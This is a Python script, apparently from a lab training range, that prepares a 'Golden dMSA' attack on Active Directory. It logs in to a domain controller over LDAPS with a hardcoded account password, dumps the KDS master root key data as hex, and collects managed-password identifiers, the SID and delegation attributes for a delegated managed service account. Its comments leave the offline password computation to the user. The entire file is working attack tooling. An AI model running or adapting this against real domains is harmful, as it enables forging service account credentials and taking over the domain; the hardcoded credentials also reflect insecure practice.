# WT099 prep — Golden dMSA prereqs (Rule 3). Canonical: wt099-dmsa-prereq.ps1 (DirectoryEntry).
# This ldap3 variant is retained for reference; cross-forest referrals to dc03 break ldap3 on ws01.
# From ws01: read range.local KDS root key + dmsaPrivService$ metadata via dc01 LDAPS
# (cross-forest naming context). Offline password compute = user practice.
import base64
from ldap3 import Server, Connection, NTLM, ALL

DC01 = "192.168.77.10"
USER = "cadre.local\\chief_command"
PASS = "C0mm@nd_Ch1ef!"

server = Server(DC01, port=636, use_ssl=True, get_info=ALL)
conn = Connection(server, user=USER, password=PASS, authentication=NTLM, auto_bind=True)
conn.strategy.auto_referrals = False
print("LDAPS_BIND_OK", USER)

# --- range.local KDS root keys ---
kds_base = (
    "CN=Master Root Keys,CN=Group Key Distribution Service,"
    "CN=Services,CN=Configuration,DC=range,DC=local"
)
conn.search(kds_base, "(objectClass=*)", attributes=["*"])
print("KDS_ENTRIES", len(conn.entries))
for e in conn.entries:
    print("KDS_DN", e.entry_dn)
    key_attr = next((a for a in e.entry_attributes if a.lower() == "mskds-rootkeydata"), None)
    if key_attr is None:
        continue
    blob = e[key_attr].value
    if isinstance(blob, bytes):
        print("RANGE_ROOTKEY_BLOB_LEN", len(blob))
        print("RANGE_ROOTKEY_HEX", blob.hex().upper()[:128])
        if len(blob) >= 16:
            b = blob[:16]
            guid = "%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X" % (
                int.from_bytes(b[0:4], "big"),
                int.from_bytes(b[4:6], "big"),
                int.from_bytes(b[6:8], "big"),
                b[8], b[9], b[10], b[11], b[12], b[13], b[14], b[15],
            )
            print("RANGE_ROOTKEY_GUID", guid)

# --- dMSA dmsaPrivService$ (ACE#24) ---
conn.search(
    "CN=Managed Service Accounts,DC=range,DC=local",
    "(sAMAccountName=dmsaPrivService$)",
    attributes=[
        "msDS-ManagedPassword",
        "msDS-ManagedPasswordId",
        "msDS-ManagedPasswordPreviousId",
        "objectSid",
        "msDS-DelegatedMSAState",
        "msDS-DelegatedManagedServiceAccount",
    ],
)
print("DMSA_ENTRIES", len(conn.entries))
for e in conn.entries:
    print("DMSA_DN", e.entry_dn)
    sid_raw = e["objectSid"].raw_values[0] if e["objectSid"].raw_values else None
    if isinstance(sid_raw, bytes):
        rev = sid_raw[0]
        subauth = sid_raw[1]
        ia = int.from_bytes(sid_raw[2:8], "big")
        subs = [int.from_bytes(sid_raw[8 + i * 4 : 12 + i * 4], "little") for i in range(subauth)]
        sid_str = "S-%d-%d" % (rev, ia) + "".join("-%d" % s for s in subs)
        print("DMSA_SID", sid_str)
    for attr in ("msDS-DelegatedMSAState", "msDS-DelegatedManagedServiceAccount"):
        if attr in e.entry_attributes:
            print(attr, e[attr].value)
    pid = e["msDS-ManagedPasswordId"].raw_values[0] if e["msDS-ManagedPasswordId"].raw_values else None
    if isinstance(pid, bytes):
        print("DMSA_PWDID_B64", base64.b64encode(pid).decode())
        print("DMSA_PWDID_LEN", len(pid))
        if len(pid) >= 40:
            b = pid[24:40]
            guid = "%02X%02X%02X%02X-%02X%02X-%02X%02X-%02X%02X-%02X%02X%02X%02X%02X%02X" % tuple(b)
            print("DMSA_PWDID_KEYGUID", guid)
    mp = e["msDS-ManagedPassword"].raw_values[0] if e["msDS-ManagedPassword"].raw_values else None
    if isinstance(mp, bytes):
        print("DMSA_MP_BLOB_LEN", len(mp))

conn.unbind()
print("WT099_PREP_DONE")
